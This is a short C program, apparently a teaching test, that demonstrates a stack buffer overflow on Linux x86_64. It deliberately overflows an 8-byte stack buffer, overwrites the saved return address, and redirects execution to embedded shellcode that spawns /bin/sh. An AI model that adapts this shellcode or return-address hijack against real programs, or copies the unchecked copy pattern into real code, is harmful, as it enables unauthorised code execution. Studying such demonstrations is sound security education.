/*
 * simple stack overflow attack test
 * target: Linux x86_64
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* execl /bin/sh, run objcopy for more details */
static const char shcode[] = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05";

static char msg[] = {
  0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
  0xeb, 0xfe, 0x01, 0x00, 0x00, 0x00, 0xeb, 0xfe,
  0xeb, 0xfe, 0x02, 0x00, 0x00, 0x00, 0xeb, 0xfe,   // rbp
  0xeb, 0xfe, 0x03, 0x00, 0x00, 0x00, 0xeb, 0xfe,   // return address
};

__attribute__((noinline)) void mymemcpy(void* dst, const void* src, size_t size)
{
  memcpy(dst, src, size);
}

__attribute__((noinline)) int overflow(void)
{
  char line[8] = {0,};

  mymemcpy(line, msg, sizeof(msg)/sizeof(msg[0]));         // force stack overflow manually
  line[7] = '\0';
  printf("hello %s\n", line);

  return 0;
}

int main(int argc, char* argv[])
{
  long* ptr = (long*)(msg+0x18);          // return address
  *ptr = (long)shcode;                    // point to the shell code
  overflow();
  printf("hijack failed.\n");             // shouldn't run into here
  return 0;
}
